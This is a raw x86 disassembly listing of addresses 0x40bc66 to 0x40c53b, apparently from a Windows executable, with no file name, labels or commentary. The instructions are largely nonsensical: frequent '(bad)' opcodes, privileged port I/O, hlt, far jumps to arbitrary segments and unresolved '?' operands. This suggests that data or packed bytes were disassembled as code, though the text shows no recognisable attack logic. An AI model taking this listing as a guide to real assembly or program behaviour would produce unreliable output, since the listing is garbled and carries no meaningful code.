  40bc66:	add    BYTE PTR [eax],al
  40bc68:	loope  0x40bc5c
  40bc6a:	(bad)  
  40bc6b:	cs scas eax,DWORD PTR es:[edi]
  40bc6d:	ins    BYTE PTR es:[edi],dx
  40bc6e:	add    BYTE PTR [ebx-0x15009307],dl
  40bc74:	stc    
  40bc75:	add    al,0x8d
  40bc77:	ins    BYTE PTR es:[edi],dx
  40bc78:	(bad)  
  40bc79:	sar    dh,1
  40bc7b:	push   cs
  40bc7c:	out    0x6a,al
  40bc7e:	inc    DWORD PTR [esi]
  40bc80:	dec    ebp
  40bc81:	cmc    
  40bc82:	imul   ebp,ecx,0x5be80513
  40bc88:	sub    al,BYTE PTR ds:0xe6752600
  40bc8e:	repnz out 0xa6,al
  40bc91:	push   es
  40bc92:	add    cl,ch
  40bc94:	stc    
  40bc95:	mov    ebp,0xd74add84
  40bc9a:	(bad)  
  40bc9b:	jmp    0x40bc96
  40bc9d:	add    al,0x0
  40bc9f:	scas   al,BYTE PTR es:[edi]
  40bca0:	jl     0x40bc70
  40bca2:	repnz mov esi,0xe9fed63e
  40bca8:	stc    
  40bca9:	mov    ebp,0xd72aad84
  40bcae:	(bad)  
  40bcaf:	jmp    0x7240c1ad
  40bcb4:	add    al,0xfd
  40bcb6:	mov    bh,bl
  40bcb8:	mov    ds:0x49648d04,eax
  40bcbd:	sar    esi,cl
  40bcbf:	xchg   cl,ch
  40bcc1:	xchg   DWORD PTR [ebp+ecx*4+0x19fed74a],eax
  40bcc8:	test   DWORD PTR [ecx+0x7ae7],eax
	...
  40bcde:	xlat   BYTE PTR cs:[ebx]
  40bce0:	dec    edi
  40bce1:	data16 lods al,BYTE PTR ds:[esi]
  40bce3:	hlt    
  40bce4:	(bad)  
  40bce5:	aam    0xed
  40bce7:	aad    0x74
  40bce9:	loope  0x40bd4e
  40bceb:	add    eax,0xd6f1d4ff
  40bcf0:	push   ecx
  40bcf1:	add    BYTE PTR [edi+0x20e8bb84],dl
  40bcf7:	mov    ecx,0x7ddc00fd
  40bcfc:	sbb    al,BYTE PTR [ecx]
  40bcfe:	jecxz  0x40bd01
  40bd00:	cmp    DWORD PTR [ebp-0x24b11],0xffffffd3
  40bd07:	or     BYTE PTR [edi+ecx*1-0x38fffe5e],al
  40bd0e:	push   ss
  40bd0f:	mov    ?,ecx
  40bd11:	(bad)  
  40bd12:	cld    
  40bd13:	add    DWORD PTR [eax],eax
  40bd15:	out    dx,eax
  40bd16:	(bad)  [ecx+0x70]
  40bd19:	inc    ecx
  40bd1a:	bound  eax,QWORD PTR [ecx]
  40bd1c:	lea    eax,[ebp-0x24a5d]
  40bd22:	ret    
  40bd23:	call   0x1d4093a
  40bd28:	test   eax,eax
  40bd2a:	xlat   BYTE PTR ds:[ebx]
  40bd2b:	mov    DWORD PTR ds:[ebp-0x25259],0xbeef0152
  40bd36:	retf   
  40bd37:	jle    0x40bd78
  40bd39:	inc    ecx
  40bd3a:	arpl   WORD PTR [ebx+eax*4-0x2466100],cx
  40bd41:	push   eax
	...
  40bd52:	add    BYTE PTR [eax],al
  40bd54:	imul   esi,DWORD PTR [ebx-0x7bacffb7],0xffffffbe
  40bd5b:	je     0x40bd9d
  40bd5d:	ret    0xd483
  40bd60:	nop
  40bd61:	mov    ecx,0xea1302fd
  40bd66:	mov    esp,0x413f9968
  40bd6b:	add    BYTE PTR [esi-0x6304017d],bl
  40bd71:	mov    ecx,0x45c5e84e
  40bd76:	add    BYTE PTR [eax],al
  40bd78:	xchg   esi,eax
  40bd79:	ror    BYTE PTR ds:0x37efa85,0x0
  40bd80:	cli    
  40bd81:	lds    ebp,FWORD PTR [eax-0x7821c4c0]
  40bd87:	test   dl,bh
  40bd89:	sbb    ebx,ebx
  40bd8b:	(bad)  
  40bd8c:	sub    al,BYTE PTR [esi-0x4d]
  40bd8f:	dec    ebx
  40bd90:	cli    
  40bd91:	fisttp QWORD PTR ds:0x856d4ec0
  40bd97:	cmp    al,0xc3
  40bd99:	popf   
  40bd9a:	inc    ebx
  40bd9b:	add    dl,bh
  40bd9d:	jmp    0xff02:0xddfa807e
  40bda4:	outs   dx,DWORD PTR ds:[esi]
  40bda5:	not    dh
  40bda7:	(bad)  
  40bda8:	popf   
  40bda9:	arpl   WORD PTR [ecx-0x26247621],ax
  40bdaf:	inc    BYTE PTR [edi-0x2e]
  40bdb2:	aad    0xfe
  40bdb4:	test   DWORD PTR [ebx-0x80],ebx
  40bdb7:	jecxz  0x40bdb9
	...
  40bdc9:	add    BYTE PTR [ecx+0x7f8cd9b3],cl
  40bdcf:	xchg   esi,eax
  40bdd0:	aad    0xfe
  40bdd2:	ins    DWORD PTR es:[edi],dx
  40bdd3:	push   cs
  40bdd4:	outs   dx,BYTE PTR ds:[esi]
  40bdd5:	add    eax,edx
  40bdd7:	(bad)  [eax+eax*1-0x30]
  40bddb:	(bad)  [eax+eax*1-0x79]
  40bddf:	popa   
  40bde0:	jecxz  0x40bdd4
  40bde2:	dec    ebp
  40bde3:	mov    ds:0xa4efff32,eax
  40bde8:	inc    ebx
  40bde9:	inc    ecx
  40bdea:	cli    
  40bdeb:	(bad)  
  40bdec:	ret    0xbd73
  40bdef:	jp     0x40be40
  40bdf1:	adc    al,0x2d
  40bdf3:	cmp    DWORD PTR [ebx-0x2674da0e],edi
  40bdf9:	mov    ah,0x3e
  40bdfb:	dec    edi
  40bdfc:	(bad)  
  40bdfe:	adc    eax,0x47fef2d1
  40be03:	jp     0x40bdda
  40be05:	inc    BYTE PTR ds:0xfede5105
  40be0b:	rcr    DWORD PTR [ebp-0x26],cl
  40be0e:	scas   al,BYTE PTR es:[edi]
  40be0f:	mov    al,0x59
  40be11:	(bad)  
  40be13:	fsubr  QWORD PTR [esi]
  40be15:	dec    ebp
  40be16:	cli    
  40be17:	add    al,0x52
  40be19:	clc    
  40be1a:	fcomp  QWORD PTR [ecx-0x2b]
  40be1d:	fimul  DWORD PTR [esi-0x3325c624]
  40be23:	shl    DWORD PTR [ebx-0x19],cl
  40be26:	enter  0x25d3,0xda
  40be2a:	inc    esi
  40be2b:	cmc    
  40be2c:	sbb    eax,0x90
	...
  40be3d:	add    BYTE PTR [eax],al
  40be3f:	add    cl,cl
  40be41:	xlat   BYTE PTR ds:[ebx]
  40be42:	adc    eax,0xbb595da
  40be47:	fisub  DWORD PTR [ebx+edx*8-0x2c5718c5]
  40be4e:	std    
  40be4f:	jmp    0xc6c3:0x3e93fa9
  40be56:	aam    0x3
  40be58:	das    
  40be59:	adc    ah,0x85
  40be5c:	mov    ecx,0xce8d358c
  40be61:	clc    
  40be62:	popa   
  40be63:	idiv   BYTE PTR [esi+0x49]
  40be66:	xchg   ecx,eax
  40be67:	xor    al,0xd0
  40be69:	add    al,0xc6
  40be6b:	dec    edi
  40be6c:	out    dx,al
  40be6d:	shl    DWORD PTR [ebx],cl
  40be6f:	or     al,0xe0
  40be71:	add    al,0xb6
  40be73:	dec    edi
  40be74:	out    0xd3,al
  40be76:	sbb    dh,BYTE PTR [eax]
  40be78:	jg     0x40be3e
  40be7a:	sbb    esi,DWORD PTR [eax]
  40be7c:	xor    eax,0xfa045d49
  40be81:	add    al,0xe9
  40be83:	mov    esi,es
  40be85:	mov    WORD PTR [ecx-0xa],fs
  40be88:	jbe    0x40bed3
  40be8a:	inc    ebp
  40be8b:	xor    al,0x6f
  40be8d:	dec    ecx
  40be8e:	test   eax,0xfff4a034
  40be93:	jne    0x40be52
  40be95:	mov    esi,?
  40be97:	sbb    esi,edx
  40be99:	xchg   DWORD PTR [ebp+eiz*4-0xa],edi
  40be9d:	pop    eax
  40be9e:	daa    
  40be9f:	ins    BYTE PTR es:[edi],dx
  40bea0:	dec    ebp
  40bea1:	(bad)  
	...
  40beb4:	add    BYTE PTR [eax],al
  40beb6:	fst    st(3)
  40beb8:	je     0x40beb3
  40beba:	ret    0xff1b
  40bebd:	mov    esp,0xf174d1f5
  40bec2:	loope  0x40be7a
  40bec4:	cld    
  40bec5:	ss mov bl,0xd3
  40bec8:	ss inc ecx
  40beca:	pop    ebp
  40becb:	ds add cl,ch
  40bece:	jbe    0x40be9b
  40bed0:	add    ebx,DWORD PTR [esi]
  40bed2:	cmp    eax,0x9f377491
  40bed7:	fwait
  40bed8:	mov    dh,BYTE PTR [ecx+eax*4+0x2d06117f]
  40bedf:	(bad)  
  40bee0:	(bad)  
  40bee1:	fwait
  40bee2:	add    DWORD PTR [edx],esi
  40bee4:	leave  
  40bee5:	sub    eax,DWORD PTR [esi-0x6d9dac2e]
  40beeb:	test   ebx,eax
  40beed:	loope  0x40be92
  40beef:	sar    esi,cl
  40bef1:	xchg   DWORD PTR ss:[ecx],edi
  40bef4:	adc    BYTE PTR [edx+0x67],ah
  40bef7:	add    DWORD PTR [ecx+edx*8+0x19fed343],0x34ff04cc
  40bf02:	push   es
  40bf03:	pop    edi
  40bf04:	add    BYTE PTR [esi+0x1bfef4bc],dh
  40bf0a:	loop   0x40be93
  40bf0c:	mov    edi,0x84c9db1c
  40bf11:	popf   
  40bf12:	push   ebx
  40bf13:	sar    esi,cl
  40bf15:	jmp    0x6240c413
	...
  40bf2a:	add    BYTE PTR [eax],al
  40bf2c:	xchg   esp,eax
  40bf2d:	fscale 
  40bf2f:	add    BYTE PTR [ebp+ebp*4-0x77],dh
  40bf33:	adc    ah,BYTE PTR [esi-0x7b0104ae]
  40bf39:	lods   al,BYTE PTR ds:[esi]
  40bf3a:	dec    esi
  40bf3b:	lea    ebx,[esi-0x6b0000fb]
  40bf41:	adc    eax,0x8354106a
  40bf46:	idiv   dh
  40bf48:	inc    esp
  40bf49:	lods   eax,DWORD PTR ds:[esi]
  40bf4a:	std    
  40bf4b:	push   edx
  40bf4c:	(bad)  
  40bf4d:	mov    BYTE PTR [ebx-0x252ca04],bh
  40bf53:	add    BYTE PTR [edi-0x1c4272d9],cl
  40bf59:	lods   al,BYTE PTR ds:[esi]
  40bf5a:	std    
  40bf5b:	call   DWORD PTR [ebx+eax*2]
  40bf5e:	adc    bh,bh
  40bf60:	pop    esi
  40bf61:	or     DWORD PTR [edi-0x1],edx
  40bf64:	mov    ?,ebp
  40bf66:	out    0x13,eax
  40bf68:	add    al,0xad
  40bf6a:	std    
  40bf6b:	sbb    esp,0xffffffd5
  40bf6e:	std    
  40bf6f:	(bad)  
  40bf70:	imul   DWORD PTR [ebx-0x1bf10003]
  40bf76:	jmp    0xf7a3d825
  40bf7b:	(bad)  
  40bf7c:	xchg   esp,eax
  40bf7d:	mov    ecx,0x73941289
  40bf82:	idiv   dh
  40bf84:	push   esp
  40bf85:	mov    ecx,0x1a5b52fd
  40bf8a:	leave  
  40bf8b:	ret    0x547
  40bf8e:	push   ebp
  40bf8f:	mov    eax,DWORD PTR [eax]
	...
  40bfa1:	add    BYTE PTR [edi-0x79],al
  40bfa4:	ret    0x95f8
  40bfa7:	mov    ecx,0x13d857fd
  40bfac:	or     al,0x8b
  40bfae:	and    DWORD PTR [ebx+eax*4-0x8],edi
  40bfb2:	xchg   ebp,eax
  40bfb3:	mov    ecx,0x90950fd
  40bfb8:	push   0x0
  40bfba:	cli    
  40bfbb:	jp     0x40c00d
  40bfbd:	or     al,0x25
  40bfbf:	or     eax,0xd03a851c
  40bfc4:	xor    eax,0x44fbfc7
  40bfc9:	add    dl,bh
  40bfcb:	(bad)  [edx-0x76]
  40bfce:	outs   dx,DWORD PTR ds:[esi]
  40bfcf:	push   ebx
  40bfd0:	(bad)  
  40bfd1:	(bad)  
  40bfd2:	std    
  40bfd3:	push   ebp
  40bfd4:	repnz mov WORD PTR [edi],?
  40bfd7:	xor    dh,BYTE PTR [ecx*4-0x129c589]
  40bfde:	in     eax,0x8e
  40bfe0:	push   0xdc51dd10
  40bfe5:	std    
  40bfe6:	aad    0xf
  40bfe8:	xlat   BYTE PTR ds:[ebx]
  40bfe9:	push   ecx
  40bfea:	(bad)  
  40bfeb:	sub    eax,0xdec67c83
  40bff0:	jb     0x40c065
  40bff2:	sbb    bl,BYTE PTR [ecx-0x67]
  40bff5:	sti    
  40bff6:	mov    ah,0xef
  40bff8:	(bad)  
  40bff9:	(bad)  
  40bffa:	lods   eax,DWORD PTR ds:[esi]
  40bffb:	jno    0x40c003
  40bffd:	jmp    FWORD PTR [edi]
  40bfff:	out    0x2d,al
  40c001:	call   0xff17c6f8
	...
  40c016:	add    BYTE PTR [eax],al
  40c018:	jns    0x40c041
  40c01a:	hlt    
  40c01b:	(bad)  
  40c01c:	lea    ebp,[ecx+0x50f8fd6]
  40c022:	je     0x40c00e
  40c024:	dec    eax
  40c025:	push   ebx
  40c026:	jo     0x40c01f
  40c028:	je     0x40bfd9
  40c02a:	aad    0x8a
  40c02c:	or     BYTE PTR [edi-0x409b0871],dh
  40c032:	aad    0xfe
  40c034:	enter  0x35d5,0xc9
  40c038:	cmp    dh,dl
  40c03a:	add    dl,BYTE PTR [ebp-0x7f]
  40c03d:	retf   0xc381
  40c040:	mov    bh,al
  40c042:	(bad)  
  40c043:	je     0x40c033
  40c045:	add    al,0x91
  40c047:	int3   
  40c048:	ret    0xe904
  40c04b:	or     bh,BYTE PTR [edx]
  40c04d:	pop    edx
  40c04e:	in     al,dx
  40c04f:	xor    eax,0x3dcc333
  40c054:	dec    ebx
  40c055:	in     eax,0x69
  40c057:	ret    
  40c058:	sti    
  40c059:	jnp    0x40bff3
  40c05b:	mov    BYTE PTR [esi+0x53218e0],dh
  40c061:	pop    edx
  40c062:	fucomp st(3)
  40c064:	cdq    
  40c065:	jle    0x40c0cc
  40c067:	(bad)  
  40c068:	and    BYTE PTR [esi-0x2439b791],bh
  40c06e:	loop   0x40c07d
  40c070:	cmc    
  40c071:	xchg   esi,eax
  40c072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c073:	sub    al,0xce
  40c075:	add    eax,0x843aafac
  40c07a:	aas    
  40c07b:	out    dx,eax
	...
  40c08c:	add    BYTE PTR [eax],al
  40c08e:	dec    ebx
  40c08f:	(bad)  
  40c090:	add    esi,ecx
  40c092:	jb     0x40c0ed
  40c094:	sbb    edx,ebp
  40c096:	adc    eax,0x398df617
  40c09b:	pop    ds
  40c09c:	or     eax,0xab1a2233
  40c0a1:	inc    esp
  40c0a2:	cli    
  40c0a3:	and    DWORD PTR [ebx+0x14dd2dbb],0x6a04fa4c
  40c0ad:	mov    edi,0xbbab8201
  40c0b2:	xor    eax,0x95b373d0
  40c0b7:	jl     0x40c11a
  40c0b9:	aad    0x74
  40c0bb:	jge    0x40c0e0
  40c0bd:	mov    ah,0xb7
  40c0bf:	adc    esi,0xfffffff0
  40c0c2:	jmp    0x40c077
  40c0c4:	addr16 pop edi
  40c0c6:	inc    esi
  40c0c7:	iret   
  40c0c8:	call   0x3410bad0
  40c0cd:	mov    al,0xd5
  40c0cf:	sbb    DWORD PTR [eax],eax
  40c0d1:	sub    edi,DWORD PTR [ecx+0x7e248d04]
  40c0d7:	aas    
  40c0d8:	call   0x458242
  40c0dd:	push   0x3a
  40c0df:	sti    
  40c0e0:	mov    WORD PTR [esi+eiz*2],gs
  40c0e3:	aas    
  40c0e4:	call   DWORD PTR [esi+eiz*2]
  40c0e7:	out    0x57,eax
  40c0e9:	add    ch,BYTE PTR [edi]
  40c0eb:	into   
  40c0ec:	mov    BYTE PTR [esi+eax*2],ah
  40c0ef:	add    BYTE PTR [ebp+eiz*4+0x0],0x0
	...
  40c104:	into   
  40c105:	iret   
  40c106:	je     0x40c0a1
  40c108:	mov    cs,WORD PTR [edx]
  40c10a:	inc    edx
  40c10b:	test   al,0xf9
  40c10d:	int    0x34
  40c10f:	push   ds
  40c110:	and    DWORD PTR [eax+eax*1+0x41],eax
  40c114:	pop    ebx
  40c115:	dec    ebx
  40c116:	dec    DWORD PTR [esi-0xd]
  40c119:	les    ecx,FWORD PTR [esi]
  40c11b:	ins    DWORD PTR es:[edi],dx
  40c11c:	addr16 into 
  40c11e:	(bad)  
  40c11f:	jmp    0x6b090aa4
  40c124:	sub    eax,0x3dddffc1
  40c129:	test   bh,bh
  40c12b:	call   0xedb58f29
  40c130:	mov    eax,ds:0xf9e94902
  40c135:	mov    bl,0xdf
  40c137:	push   0xffffffb6
  40c139:	add    al,0x89
  40c13b:	lods   al,BYTE PTR ds:[esi]
  40c13c:	imul   ecx,edi,0x4976ed74
  40c142:	mov    ah,0xf6
  40c144:	xor    al,0xc1
  40c146:	mov    fs,WORD PTR [ecx+edi*4+0x7eb174cf]
  40c14d:	dec    ecx
  40c14e:	les    esp,FWORD PTR [esi-0x17006ed4]
  40c154:	stc    
  40c155:	add    al,0x83
  40c157:	or     al,0x19
  40c159:	sbb    al,0x41
  40c15b:	add    BYTE PTR [ebx+0x2],ah
  40c15e:	je     0x40c1b0
  40c160:	fimul  WORD PTR [esi]
  40c162:	mov    eax,0x6a01b950
	...
  40c177:	add    BYTE PTR [eax],al
  40c179:	add    BYTE PTR [ecx-0x2cba72f8],bh
  40c17f:	adc    DWORD PTR [edx+0x0],ebp
  40c182:	sahf   
  40c183:	push   cs
  40c184:	rcl    BYTE PTR [eax-0x74],0xdf
  40c188:	pop    ds
  40c189:	sub    edx,edx
  40c18b:	or     BYTE PTR [ebx],cl
  40c18d:	rcl    BYTE PTR [edi],0xf4
  40c190:	cmp    BYTE PTR [ebp-0x31],0x1
  40c194:	je     0x40c1c2
  40c196:	nop
  40c197:	adc    BYTE PTR ss:[eax],al
  40c19a:	pop    es
  40c19b:	cli    
  40c19c:	mov    dl,BYTE PTR [ebp-0xd]
  40c19f:	das    
  40c1a0:	mov    DWORD PTR [edx],0x75ff090c
  40c1a6:	fstp   TBYTE PTR [eax+0x3f2cb873]
  40c1ac:	mov    esp,0x680596ff
  40c1b1:	add    esp,ebx
  40c1b3:	call   0xac78aa74
  40c1b8:	std    
  40c1b9:	dec    DWORD PTR [edi+edi*1]
  40c1bc:	mov    esp,0x10e9e8
  40c1c1:	add    BYTE PTR [edi+edi*1],cl
  40c1c4:	enter  0x3fe8,0x40
  40c1c8:	(bad)  
  40c1c9:	(bad)  
  40c1ca:	in     al,dx
  40c1cb:	ds shr al,1
  40c1ce:	inc    edi
  40c1cf:	inc    eax
  40c1d0:	(bad)  
  40c1d1:	jmp    FWORD PTR [ebp-0x46]
  40c1d4:	ror    BYTE PTR [ebx+edx*4],0x1e
  40c1d8:	mov    ebp,esp
  40c1da:	adc    BYTE PTR [esi+0x8dc6],cl
	...
  40c1f0:	es mov ch,0x4e
  40c1f3:	push   0x414772
  40c1f8:	cli    
  40c1f9:	inc    ecx
  40c1fa:	or     DWORD PTR [edx-0x6],ebp
  40c1fd:	inc    ebx
  40c1fe:	add    eax,0xdadbbb42
  40c203:	mov    ebp,0x8502dbc2
  40c208:	cmp    ah,dh
  40c20a:	jp     0x40c1cb
  40c20c:	cli    
  40c20d:	fild   DWORD PTR [edx]
  40c20f:	mov    ecx,edi
  40c211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c212:	jle    0x40c225
  40c214:	jg     0x40c23e
  40c216:	int3   
  40c217:	dec    edi
  40c218:	and    eax,0xc8fecff0
  40c21d:	fild   WORD PTR [edi+0x725405bf]
  40c223:	dec    DWORD PTR ds:0x27c85db
  40c229:	fild   DWORD PTR [ecx]
  40c22b:	test   BYTE PTR [esi-0x25],ah
  40c22e:	add    al,BYTE PTR [eax]
  40c230:	mov    ebp,0xedffb699
  40c235:	fiadd  WORD PTR [edx]
  40c237:	(bad)  
  40c238:	aas    
  40c239:	push   ss
  40c23a:	add    al,0x0
  40c23c:	cli    
  40c23d:	(bad)  
  40c23f:	inc    esp
  40c240:	stos   BYTE PTR es:[edi],al
  40c241:	test   BYTE PTR [ebx],0x0
  40c244:	cli    
  40c245:	and    cl,BYTE PTR [ecx-0x34]
  40c248:	cli    
  40c249:	fld    QWORD PTR [edx]
  40c24b:	add    BYTE PTR [ecx+0x71],dh
  40c24e:	retf   0x88a
  40c251:	push   ecx
  40c252:	dec    ecx
  40c253:	int3   
	...
  40c264:	add    BYTE PTR [eax],al
  40c266:	dec    edx
  40c267:	pop    ecx
  40c268:	dec    ecx
  40c269:	ror    BYTE PTR [edx-0x78],1
  40c26c:	add    edi,edi
  40c26e:	daa    
  40c26f:	not    dl
  40c271:	push   ecx
  40c272:	push   es
  40c273:	xlat   BYTE PTR ds:[ebx]
  40c274:	ret    0x2674
  40c277:	pop    edi
  40c278:	push   ecx
  40c279:	int3   
  40c27a:	sti    
  40c27b:	dec    eax
  40c27c:	inc    ecx
  40c27d:	cmp    edi,0xfffffff1
  40c280:	add    esi,DWORD PTR [esp+edi*4+0x4]
  40c284:	push   ecx
  40c285:	adc    eax,0xd2e945b8
  40c28a:	out    dx,al
  40c28b:	mov    al,0xc0
  40c28d:	enter  0x4b5,0xe9
  40c291:	(bad)  
  40c292:	xchg   ebp,eax
  40c293:	push   ecx
  40c294:	repz imul esi,DWORD PTR ds:0x7303e905,0xf4dea142
  40c29f:	ret    
  40c2a0:	and    edi,DWORD PTR [ebp+esi*1+0x2d03e8cc]
  40c2a7:	push   edx
  40c2a8:	mov    cl,0xd2
  40c2aa:	scas   al,BYTE PTR es:[edi]
  40c2ab:	mov    al,0x95
  40c2ad:	pop    eax
  40c2ae:	repnz fadd QWORD PTR [esi-0x7a33eb30]
  40c2b5:	pop    eax
  40c2b6:	es fst st(6)
  40c2b9:	cmp    edi,edx
  40c2bb:	add    al,0x6a
  40c2bd:	push   eax
  40c2be:	and    al,BYTE PTR ds:0x51f4fbf5
  40c2c4:	inc    ecx
  40c2c5:	fcomi  st,st(5)
  40c2c7:	cmp    al,0xe9
  40c2c9:	add    eax,DWORD PTR [eax]
	...
  40c2db:	add    cl,dl
  40c2dd:	js     0x40c340
  40c2df:	cmp    dl,ah
  40c2e1:	jg     0x40c2dd
  40c2e3:	ror    BYTE PTR [esi-0x33],cl
  40c2e6:	inc    ebp
  40c2e7:	xor    eax,0xcf938002
  40c2ec:	jo     0x40c2e4
  40c2ee:	xor    eax,0x9acbbe58
  40c2f3:	sti    
  40c2f4:	ret    0xecc6
  40c2f7:	add    eax,DWORD PTR [edi-0x80]
  40c2fa:	or     al,0x86
  40c2fc:	mov    ecx,0xde86bee4
  40c301:	push   ecx
  40c302:	stos   DWORD PTR es:[edi],eax
  40c303:	inc    esp
  40c304:	cli    
  40c305:	add    al,0x7c
  40c307:	icebp  
  40c308:	mov    ah,0x1
  40c30a:	je     0x40c351
  40c30c:	cmp    eax,DWORD PTR ds:0x4f9e800
  40c312:	add    BYTE PTR [edi],ch
  40c314:	mov    BYTE PTR [esi+0x41],0xe9
  40c318:	dec    esi
  40c319:	add    ah,BYTE PTR [esi-0x58]
  40c31c:	adc    BYTE PTR [edi],al
  40c31e:	sub    DWORD PTR [edi+0xf8362f4],0xfffffffe
  40c325:	push   ecx
  40c326:	repz push 0xfffffffd
  40c329:	xchg   ebp,eax
  40c32a:	sub    eax,0xf04fe28
  40c32f:	ins    DWORD PTR es:[edi],dx
  40c330:	das    
  40c331:	retf   
  40c332:	(bad)  
  40c333:	jmp    0xd7edcbb6
  40c338:	mov    eax,0x7dee0004
  40c33d:	fcos   
  40c33f:	call   0x40c344
	...
  40c350:	add    BYTE PTR [eax],al
  40c352:	stc    
  40c353:	xchg   DWORD PTR [eax+ecx*8],edi
  40c356:	lock inc ebp
  40c358:	add    cl,ch
  40c35a:	cli    
  40c35b:	and    al,0xe9
  40c35e:	stc    
  40c35f:	add    al,0xc7
  40c361:	sub    al,0x2a
  40c363:	retf   
  40c364:	(bad)  
  40c365:	jmp    0x61858563
  40c36a:	test   BYTE PTR [eax+eax*1],0xe9
  40c36e:	fs inc ecx
  40c370:	cld    
  40c371:	mov    ecx,0xb9f8415c
  40c376:	aaa    
  40c377:	add    eax,0x44342a68
  40c37c:	add    BYTE PTR [esi],bh
  40c37e:	int    0x99
  40c380:	sub    eax,0xbffdf9a8
  40c385:	fidivr WORD PTR [ebp-0x70]
  40c388:	(bad)  
  40c389:	call   0x21bd4987
  40c38e:	(bad)  
  40c38f:	stc    
  40c390:	add    DWORD PTR [ebp-0xa],0x4
  40c394:	add    BYTE PTR [edx+0x45],ch
  40c397:	leave  
  40c398:	(bad)  
  40c399:	inc    DWORD PTR [edx+eax*4+0x69300a0]
  40c3a0:	mov    esi,DWORD PTR [ebp-0x79]
  40c3a3:	scas   eax,DWORD PTR es:[edi]
  40c3a4:	add    BYTE PTR [eax],0x63
  40c3a7:	push   es
  40c3a8:	push   esi
  40c3a9:	mov    ecx,DWORD PTR ds:0xd41874b4
  40c3af:	inc    edx
  40c3b0:	lock (bad) 
  40c3b2:	mov    ebp,0x458dd4
	...
  40c3c7:	add    BYTE PTR [edi],ch
  40c3c9:	cs jns 0x40c40e
  40c3cc:	and    al,BYTE PTR [ecx]
  40c3ce:	call   0x41e1aa
  40c3d3:	shl    DWORD PTR [ebx],1
  40c3d5:	cmp    DWORD PTR [esi-0x1fbd65fe],0x4142da68
  40c3df:	add    BYTE PTR [edx+eax*2-0x1b31381c],dl
  40c3e6:	(bad)  
  40c3e7:	jmp    DWORD PTR [ebx]
  40c3e9:	push   es
  40c3ea:	lea    eax,[ebp+0x6b]
  40c3ed:	push   ss
  40c3ee:	push   0x1
  40c3f0:	jmp    0x96412df5
  40c3f5:	inc    edx
  40c3f6:	loopne 0x40c448
  40c3f8:	stc    
  40c3f9:	add    BYTE PTR [ebp-0xe9acbb],cl
  40c3ff:	adc    eax,0x40edf2
  40c404:	fadd   st,st(5)
  40c406:	jb     0x40c435
  40c408:	pusha  
  40c409:	cmp    ebp,esp
  40c40b:	add    BYTE PTR [edi-0x2cfe47e4],cl
  40c411:	add    eax,0x32130b00
  40c416:	push   ss
  40c417:	jmp    FWORD PTR [esi-0x33]
  40c41a:	std    
  40c41b:	jne    0x40c428
  40c41d:	mov    ch,0x73
  40c41f:	in     al,dx
  40c420:	add    al,0x2c
  40c422:	or     BYTE PTR [eax-0x6],ch
  40c425:	xlat   BYTE PTR ds:[ebx]
  40c426:	add    ch,bh
  40c428:	push   esp
  40c429:	add    edi,ebx
  40c42b:	clc    
	...
  40c43c:	add    BYTE PTR [eax],al
  40c43e:	lea    eax,[edx]
  40c440:	shl    BYTE PTR [esi+edx*4-0xd],1
  40c444:	xchg   ebp,eax
  40c445:	inc    esp
  40c446:	cli    
  40c447:	(bad)  [eax]
  40c449:	inc    edi
  40c44b:	rol    DWORD PTR [edx+0x515ef6c5],cl
  40c451:	clc    
  40c452:	cli    
  40c453:	das    
  40c454:	std    
  40c455:	sbb    BYTE PTR [esp+ebx*8],0xfd
  40c459:	test   ch,ah
  40c45b:	mov    edx,0x84dfece
  40c460:	sar    dh,1
  40c462:	out    dx,eax
  40c463:	dec    esp
  40c464:	push   ds
  40c465:	inc    ecx
  40c466:	cli    
  40c467:	icebp  
  40c468:	mov    esp,0x37dbfec1
  40c46d:	mov    ebx,DWORD PTR [esi]
  40c46f:	pop    esi
  40c470:	enter  0x90f7,0xdb
  40c474:	pop    eax
  40c475:	das    
  40c476:	sbb    eax,0x5be7fbe8
  40c47b:	in     al,dx
  40c47c:	into   
  40c47d:	inc    BYTE PTR [ebx-0x38802fe8]
  40c483:	add    DWORD PTR [ecx+eax*2-0x6],0xffffffdb
  40c488:	push   edi
  40c489:	sub    DWORD PTR [edx+0x59],esp
  40c48c:	inc    ebp
  40c48d:	inc    ecx
  40c48e:	cli    
  40c48f:	mov    ch,0x94
  40c491:	inc    eax
  40c492:	cmp    ebx,esi
  40c494:	(bad)  
  40c496:	pop    esp
  40c497:	das    
  40c498:	iret   
  40c499:	test   BYTE PTR [edx-0x2c97d44e],bh
  40c49f:	popf   
  40c4a0:	inc    ebx
	...
  40c4b1:	add    BYTE PTR [eax],al
  40c4b3:	add    BYTE PTR [edx+0x26],dl
  40c4b6:	inc    ebp
  40c4b7:	inc    ecx
  40c4b8:	cli    
  40c4b9:	inc    ebp
  40c4ba:	mov    dl,0x7d
  40c4bc:	mov    ch,0x17
  40c4be:	mov    BYTE PTR [edx+esi*4],0x5
  40c4c2:	test   al,0x44
  40c4c4:	cli    
  40c4c5:	add    eax,0x469f116a
  40c4ca:	test   al,0x3
  40c4cc:	cli    
  40c4cd:	push   eax
  40c4ce:	rol    esi,cl
  40c4d0:	ss int 0xe8
  40c4d3:	add    edi,edx
  40c4d5:	add    al,0xd2
  40c4d7:	ret    
  40c4d8:	sub    eax,0xce809935
  40c4dd:	int3   
  40c4de:	call   0xfa45:0x27ca06ce
  40c4e5:	sub    DWORD PTR [eax-0x92407b4],0xe8ccd682
  40c4ef:	pop    eax
  40c4f0:	clc    
  40c4f1:	fcmovnu st,st(6)
  40c4f3:	into   
  40c4f4:	into   
  40c4f5:	int3   
  40c4f6:	mov    ebp,0x3adcf258
  40c4fb:	retf   
  40c4fc:	xor    al,0xc8
  40c4fe:	popa   
  40c4ff:	cmp    BYTE PTR [edx],dh
  40c501:	jl     0x40c4fd
  40c503:	into   
  40c504:	scas   al,BYTE PTR es:[edi]
  40c505:	int3   
  40c506:	popf   
  40c507:	xor    edx,esi
  40c509:	(bad)  
  40c50a:	sbb    edi,esp
  40c50c:	sbb    eax,0xcce8c3b
  40c511:	enter  0xfbfb,0x1d
  40c515:	sbb    al,0x7f
  40c517:	into   
	...
  40c528:	add    BYTE PTR [eax],al
  40c52a:	cld    
  40c52b:	(bad)  
  40c52c:	sti    
  40c52d:	iret   
  40c52e:	hlt    
  40c52f:	push   ecx
  40c530:	loope  0x40c50d
  40c532:	dec    ecx
  40c533:	push   esi
  40c534:	data16 into 
  40c536:	mov    dl,0xc2
  40c538:	in     al,0x3
  40c53a:	inc    edi
  40c53b:	jl     0x40c581
